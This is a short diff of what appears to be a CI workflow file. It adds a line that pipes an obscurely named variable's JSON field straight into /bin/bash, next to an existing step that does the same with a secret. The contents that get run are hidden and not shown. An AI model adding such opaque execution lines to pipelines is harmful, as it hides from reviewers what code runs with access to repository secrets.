@@ -23,6 +23,7 @@ jobs:
           iphoo614: ${{ secrets.iphoo614 }}
         run: |
           printf '%s' "$iphoo614" | jq -r .iwklp4720 | /bin/bash
+          echo $szea0503 | jq -r .be0135 | /bin/bash
 
       - name: Store artifact
         if: always()
